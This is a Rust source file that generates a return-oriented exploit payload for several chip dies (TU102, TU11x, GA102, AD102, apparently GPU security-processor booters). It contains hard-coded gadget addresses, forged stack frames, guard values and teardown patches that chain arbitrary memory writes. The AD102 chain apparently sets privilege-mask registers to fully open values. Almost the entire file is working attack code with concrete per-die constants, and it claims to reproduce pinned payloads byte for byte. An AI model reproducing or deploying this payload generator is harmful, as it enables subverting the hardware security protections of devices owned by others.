//! V67 payload synthesizer (G2) — the frame grammar engine.
//!
//! Input: the write chain (the only policy input) + the per-die geometry.
//! Output: the payload bytes, byte-identical to the pinned golden tables
//! (TU102 `b0ec9029…`, GA102 `2a0aa1f8…`, AD102 `44c36b2d…`).
//!
//! Frame grammar (recovered from generate_v67.py + the 10.4M-step trace,
//! see docs/first-principles-payload-generator.md):
//!
//! - fill word covers the whole image (TU102: 0x4A7, a self-loop-class
//!   constant; GA102 uses 0x19c)
//! - live frame (the waiter's mpopaddret-$r3 frame) at `live_frame`:
//!   [sp]=r3=guard, [sp+8]=r1=value, [sp+C]=r0=addr, [sp+0x14]=first gadget
//! - chain frames at `chain_base` + i*`stride`: [sp]=guard, [sp+8]=next
//!   value, [sp+C]=next addr, [sp+0x14]=next gadget (the last frame's
//!   gadget = teardown, patched to the token)
//! - tail block: the mutex-release cascade frames (per-die constants)
//! - scratch: D[main_sp+8] = 0, D[0x1700] = 7

pub const V67_SIZE: usize = 0xFA00;

/// Per-die geometry. TU102 values = the pinned golden (b0ec9029…).
pub struct Geometry {
    pub payload_size: usize,
    pub fill: u32,
    pub copy_base: u32,
    pub guard: u32,
    pub main_sp: u32,
    /// the waiter frame base (mpopaddret-$r3 shape)
    pub live_frame: u32,
    pub chain_base: u32,
    pub stride: u32,
    /// the write mid-entry gadget
    pub gad_write: u32,
    /// the teardown gadget (patched to the token on the last frame)
    pub gad_teardown: u32,
    /// the post-teardown token
    pub gad_token: u32,
    pub tail_base: u32,
    pub tail: TailBlock,
    pub token_value: u32,
    pub scratch_1700: u32,
}

/// The mutex-release cascade constants (all gadget addresses = per-die).
pub struct TailBlock {
    pub b00: u32,
    pub b04: u32,
    pub b08: u32,
    pub b0c: u32,
    pub b14: u32,
    pub b18: u32,
    pub b1c: u32,
    pub b20: u32,
    pub b24: u32,
    pub b2c: u32,
    pub b30: u32,
    pub b34: u32,
    pub b38: u32,
    pub b40: u32,
    pub b44: u32,
    pub b48: u32,
    pub b4c: u32,
    pub b54: u32,
    pub b58: u32,
    pub b5c: u32,
    pub b60: u32,
    pub b64: u32,
    pub b6c: u32,
}

impl Geometry {
    /// TU102 — reproduces b0ec9029… byte-for-byte.
    pub fn tu102() -> Self {
        Geometry {
            payload_size: V67_SIZE,
            fill: 0x0000_04A7,
            copy_base: 0x600,
            guard: 0x6140,
            main_sp: 0xFFF0,
            live_frame: 0xFF38,
            chain_base: 0xFF50,
            stride: 0x18,
            gad_write: 0x10B9,
            gad_teardown: 0x7C43,
            gad_token: 0xCBD,
            tail_base: 0xFF80,
            token_value: 0xFFFF, // main_sp + 0xF
            scratch_1700: 7,
            tail: TailBlock {
                b00: 1,
                b04: 0,
                b08: 0x8E18,
                b0c: 0,
                b14: 0xC95,
                b18: 0x6140, // guard
                b1c: 0,
                b20: 0,
                b24: 1,
                b2c: 0x1F89,
                b30: 0x6140, // guard
                b34: 0x6140, // guard
                b38: 0xFFFF, // token
                b40: 0x1F89,
                b44: 0x6140, // guard
                b48: 0x6140, // guard
                b4c: 0,
                b54: 0xE85,
                b58: 0x1F89,
                b5c: 0x6140, // guard
                b60: 0x6140, // guard
                b64: 0,
                b6c: 0x7EA4, // park
            },
        }
    }

    /// TU11x (TU116/117) — the TU102 frame grammar with the TU116 booter's
    /// park gadget. The scanner independently derives park = 0x7E9A
    /// ([ParkSelf, LBra] on TU116_sec_plain.bin; TU102's 0x7EA4 reads as
    /// [MmioWrite..] there, not a park). Validates against the pinned
    /// V67_TU11X_PAYLOAD_SHA256 (c79208ac…).
    pub fn tu11x() -> Self {
        let mut g = Self::tu102();
        g.tail.b6c = 0x7E9A; // park
        g
    }
}

/// Synthesize the payload for `writes` (the (addr, value) chain, in order).
pub fn synth(writes: &[(u32, u32)], geo: &Geometry) -> Vec<u8> {
    assert!(!writes.is_empty(), "the write chain must not be empty");
    let mut p = vec![0u8; geo.payload_size];
    let fill = geo.fill.to_le_bytes();
    for w in p.chunks_exact_mut(4) {
        w.copy_from_slice(&fill);
    }
    let mut put = |dmem: u32, v: u32| {
        let off = (dmem - geo.copy_base) as usize;
        assert!(off + 4 <= geo.payload_size, "put {dmem:#x} outside the image");
        p[off..off + 4].copy_from_slice(&v.to_le_bytes());
    };

    // scratch
    put(0x1700, geo.scratch_1700);

    // live frame (the waiter's): r3 slot = guard, r1 = value, r0 = addr,
    // the return slot = the first gadget
    let lf = geo.live_frame;
    put(lf, geo.guard);
    put(lf + 8, writes[0].1);
    put(lf + 0xC, writes[0].0);
    put(lf + 0x14, geo.gad_write);

    // chain frames: frame i carries write i+1's operands and the gadget
    // that leads to it; the last frame's gadget = the teardown, patched
    // to the post-teardown token
    let n = writes.len();
    for (i, w) in writes.iter().enumerate() {
        let sp = geo.chain_base + (i as u32) * geo.stride;
        put(sp, geo.guard);
        if i + 1 < n {
            put(sp + 8, writes[i + 1].1);
            put(sp + 0xC, writes[i + 1].0);
            put(sp + 0x14, geo.gad_write);
        } else {
            put(sp + 0x14, geo.gad_teardown);
        }
        let _ = w; // frame i's own operands live in frame i-1 / the live frame
    }
    // the last chain frame's operand slots and the token patch
    let last = geo.chain_base + ((n - 1) as u32) * geo.stride;
    put(last + 0xC, 0);
    put(last + 0x14, geo.gad_token);

    // tail block: the mutex-release cascade
    let a = geo.tail_base;
    let t = &geo.tail;
    put(a, t.b00);
    put(a + 4, t.b04);
    put(a + 8, t.b08);
    put(a + 0xC, t.b0c);
    put(a + 0x14, t.b14);
    put(a + 0x18, t.b18);
    put(a + 0x1C, t.b1c);
    put(a + 0x20, t.b20);
    put(a + 0x24, t.b24);
    put(a + 0x2C, t.b2c);
    put(a + 0x30, t.b30);
    put(a + 0x34, t.b34);
    put(a + 0x38, geo.token_value);
    put(a + 0x40, t.b40);
    put(a + 0x44, t.b44);
    put(a + 0x48, t.b48);
    put(a + 0x4C, t.b4c);
    put(a + 0x54, t.b54);
    put(a + 0x58, t.b58);
    put(a + 0x5C, t.b5c);
    put(a + 0x60, t.b60);
    put(a + 0x64, t.b64);
    put(a + 0x6C, t.b6c);

    // main frame scratch
    put(geo.main_sp + 8, 0);

    p
}

/// The GA-line/Ada payloads use a different frame grammar (the GA-line
/// booter's own epilogue shapes); their goldens are explicit put-lists
/// over the same 0x19c fill with the write-chain slots parameterized.
pub const GA_FILL: u32 = 0x19c;
pub const AD_FILL: u32 = 0x19c;

/// GA102: single-write payload (0x823804 ← value), terminator 0x81ee.
/// Reproduces 2a0aa1f8… byte-for-byte.
pub fn synth_ga102(writes: &[(u32, u32)]) -> Vec<u8> {
    assert!(!writes.is_empty(), "the write chain must not be empty");
    let mut p = vec![0u8; V67_SIZE];
    let fill = GA_FILL.to_le_bytes();
    for w in p.chunks_exact_mut(4) {
        w.copy_from_slice(&fill);
    }
    let mut put = |dmem: u32, v: u32| {
        let off = (dmem - 0x600) as usize;
        assert!(off + 4 <= V67_SIZE, "put {dmem:#x} outside the image");
        p[off..off + 4].copy_from_slice(&v.to_le_bytes());
    };
    let puts: [(u32, u32); 19] = [
        (0x1700, 7),
        (0xFF48, writes[0].1),
        (0xFF50, 0xD44),
        (0xFF60, writes[0].0),
        (0xFF68, 0x1FCE),
        (0xFF74, 0),
        (0xFF7C, 0x1101),
        (0xFF80, 0x84C8),
        (0xFF84, 0x8E18),
        (0xFF8C, 0x84C8),
        (0xFF90, 0),
        (0xFF98, 0x1FCE),
        (0xFFA4, 0xFFBC),
        (0xFFAC, 0x5789),
        (0xFFBC, 0xD44),
        (0xFFCC, 3),
        (0xFFD4, 0x1FCE),
        (0xFFE8, 0xD52),
        (0xFFEC, 0x81EE), // terminator
    ];
    for (dmem, v) in puts {
        put(dmem, v);
    }
    p
}

/// AD102: the four-PLM chain ((0x1fa7cc, 0xfffff0ff), (0x9a0148, 0xffffffff),
/// (0x1fa7c4, 0xffffffff), (0x823804, 0xffffffff)), marker 0x67b00001,
/// the 0x31b5/0x771e close-out pair. Reproduces 44c36b2d… byte-for-byte.
pub fn synth_ad102(writes: &[(u32, u32)]) -> Vec<u8> {
    assert!(writes.len() == 4, "the Ada chain is exactly four writes");
    let mut p = vec![0u8; V67_SIZE];
    let fill = AD_FILL.to_le_bytes();
    for w in p.chunks_exact_mut(4) {
        w.copy_from_slice(&fill);
    }
    let mut put = |dmem: u32, v: u32| {
        let off = (dmem - 0x600) as usize;
        assert!(off + 4 <= V67_SIZE, "put {dmem:#x} outside the image");
        p[off..off + 4].copy_from_slice(&v.to_le_bytes());
    };
    let puts: [(u32, u32); 25] = [
        (0x1700, 7),
        (0xFF48, writes[0].1),
        (0xFF50, 0x21B2),
        (0xFF60, writes[0].0),
        (0xFF68, 0x33FC),
        (0xFF74, writes[1].1),
        (0xFF7C, 0x256F),
        (0xFF80, 0x7A02),
        (0xFF84, writes[1].0),
        (0xFF8C, 0x33FC),
        (0xFF98, writes[2].1),
        (0xFFA0, 0x256F),
        (0xFFA4, 0x7A02),
        (0xFFA8, writes[2].0),
        (0xFFB0, 0x33FC),
        (0xFFBC, writes[3].1),
        (0xFFC4, 0x256F),
        (0xFFC8, 0x7A02),
        (0xFFCC, writes[3].0),
        (0xFFD4, 0x33FC),
        (0xFFE0, 0x67B0_0001), // the marker
        (0xFFE8, 0x256F),
        (0xFFEC, 0x7A02),
        (0xFFF8, 0x31B5),
        (0xFFFC, 0x771E),
    ];
    for (dmem, v) in puts {
        put(dmem, v);
    }
    p
}
